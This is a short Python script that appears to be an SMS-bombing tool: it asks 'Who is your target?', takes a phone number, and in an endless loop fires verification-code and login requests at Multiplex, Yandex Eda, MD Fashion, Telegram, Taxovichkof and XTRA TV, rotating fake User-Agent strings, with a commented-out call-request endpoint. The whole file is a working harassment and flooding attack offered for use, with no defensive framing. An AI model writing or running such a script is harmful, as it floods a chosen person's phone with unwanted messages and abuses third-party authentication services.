from user_agent import generate_user_agent
import threading
import requests

print(r"""
    __    ____   __    __  __  __ __  __ _   __ ______ ______ ____  _____
   / /   / __ \ / /   / / / /_/ // / / // | / //_  __// ____// __ \/ ___/
  / /   / / / // /   / / /  _  // / / //  |/ /  / /  / __/  / /_/ /\__ \ 
 / /___/ /_/ // /___/ / / / / // /_/ // /|  /  / /  / /___ / _  _/___/ / 
/_____/\____//_______/ /_/ /_/ \____//_/ |_/  /_/  /_____//_/ |_|/____/  
                                                                                              

""")

print('Who is your target? Type here: ')
phone = input()
#phone = ''
phone_plus = '+' + phone

def run():
	while True:
		head = {'User-Agent': generate_user_agent(), 'X-Requested-With': 'XMLHttpRequest'}
		
		response = requests.post('https://auth.multiplex.ua/login', json = {'login': phone}, headers = head)
		print('Multiplex: ' + str(response.text))
		
		response = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone_number': phone_plus}, headers = head)
		print('Yandex eda: ' + str(response.text))

		response = requests.post('https://md-fashion.com.ua/bpm/validate-contact', data = {'phone': phone_plus}, headers = head)
		print('MD Fashion: ' + str(response.text))

		response = requests.post('https://my.telegram.org/auth/send_password', data = {'phone': phone_plus}, headers = head)
		print('Telegram: ' + str(response.text))

		response = requests.post('https://taxovichkof.ru/api/userSendSms', data = {'username': phone_plus, 'lang': 'ru', 'city': 'spb'}, headers = head)
		print('Taxovichkof: ' + str(response.text))

		response = requests.post('https://my.xtra.tv/api/signup?lang=uk', data = {'phone': phone_plus}, headers = head)
		print('XTRA TV: ' + str(response.text))

		"""Call
		response = requests.get('https://findclone.ru/register', data = {'phone': phone}, headers = head)
		print('FindClone: ' + str(response.text))"""

run()